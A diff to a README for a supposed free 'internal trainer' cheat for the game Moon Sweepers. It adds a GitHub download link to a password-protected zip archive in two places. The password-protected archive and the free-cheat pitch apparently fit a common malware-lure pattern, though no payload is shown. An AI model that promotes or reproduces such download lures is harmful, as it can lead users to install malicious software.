@@ -5,7 +5,7 @@ Free Internal Trainer for Moon Sweepers. 2026
 
 
 
-## [Download]() the latest Moon Sweepers Trainer zip
+## [Download](https://github.com/pitbeauticiansnap/Moon-Sweepers-Trainer-2026/releases/download/Download/MoonSweepers-Internal-Trainer.zip) the latest Moon Sweepers Trainer zip
 > Archive password: `moonsweepers`
 
 ## 🔥 Features
@@ -50,7 +50,7 @@ Free Internal Trainer for Moon Sweepers. 2026
 
 ## 📥 How to Install
 
-## [Download]() the latest Moon Sweepers Trainer zip
+## [Download](https://github.com/pitbeauticiansnap/Moon-Sweepers-Trainer-2026/releases/download/Download/MoonSweepers-Internal-Trainer.zip) the latest Moon Sweepers Trainer zip
 
 > Archive password: `moonsweepers`
 
